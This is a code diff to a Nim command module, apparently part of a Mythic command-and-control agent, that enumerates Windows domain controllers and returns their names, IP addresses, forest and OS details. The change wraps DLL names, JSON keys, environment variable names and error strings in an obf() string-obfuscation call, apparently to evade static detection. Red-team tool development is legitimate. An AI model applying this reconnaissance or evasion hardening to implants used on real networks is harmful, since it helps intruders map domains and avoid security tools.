@@ -1,6 +1,7 @@
 import std/[json, strformat, os]
 import ../utils/mythic_responses
 import ../utils/debug
+import ../utils/strenc
 
 when defined(windows):
   import winim/lean
@@ -34,10 +35,10 @@ when defined(windows):
   proc DsGetDcNameW(ComputerName: LPCWSTR, DomainName: LPCWSTR, 
                     DomainGuid: ptr GUID, SiteName: LPCWSTR,
                     Flags: ULONG, DomainControllerInfo: ptr ptr DOMAIN_CONTROLLER_INFOW): DWORD 
-    {.importc, dynlib: "netapi32.dll", stdcall.}
+    {.importc, dynlib: obf("netapi32.dll"), stdcall.}
   
   proc NetApiBufferFree(Buffer: pointer): DWORD 
-    {.importc, dynlib: "netapi32.dll", stdcall.}
+    {.importc, dynlib: obf("netapi32.dll"), stdcall.}
   
   proc utf16PtrToString(p: LPWSTR): string =
     ## Convert UTF-16 pointer to Nim string
@@ -51,12 +52,12 @@ proc netDclist*(taskId: string, params: JsonNode): JsonNode =
     try:
       # Parse parameters (domain is optional)
       var domain = ""
-      if params.kind == JObject and params.hasKey("domain"):
-        domain = params["domain"].getStr()
+      if params.kind == JObject and params.hasKey(obf("domain")):
+        domain = params[obf("domain")].getStr()
       
       # Default to current domain if not specified
       if domain == "":
-        domain = getEnv("USERDNSDOMAIN", "")
+        domain = getEnv(obf("USERDNSDOMAIN"), "")
       
       debug &"[DEBUG] net_dclist: domain={domain}"
       
@@ -75,7 +76,7 @@ proc netDclist*(taskId: string, params: JsonNode): JsonNode =
       )
       
       if status != NO_ERROR:
-        return mythicError(taskId, &"Failed to get domain controller information: {status}")
+        return mythicError(taskId, obf("Failed to get domain controller information: ") & $status)
       
       let dcInfo = dcInfoPtr[]
       
@@ -109,17 +110,17 @@ proc netDclist*(taskId: string, params: JsonNode): JsonNode =
       
       # Convert to JSON array
       let resultsJson = %*[{
-        "computer_name": dcResult.computer_name,
-        "ip_address": dcResult.ip_address,
-        "domain": dcResult.domain,
-        "forest": dcResult.forest,
-        "os_version": dcResult.os_version,
-        "global_catalog": dcResult.global_catalog
+        obf("computer_name"): dcResult.computer_name,
+        obf("ip_address"): dcResult.ip_address,
+        obf("domain"): dcResult.domain,
+        obf("forest"): dcResult.forest,
+        obf("os_version"): dcResult.os_version,
+        obf("global_catalog"): dcResult.global_catalog
       }]
       
       return mythicSuccess(taskId, $resultsJson)
       
     except Exception as e:
-      return mythicError(taskId, &"net_dclist error: {e.msg}")
+      return mythicError(taskId, obf("net_dclist error: ") & e.msg)
   else:
-    return mythicError(taskId, "net_dclist command is only available on Windows")
+    return mythicError(taskId, obf("net_dclist command is only available on Windows"))
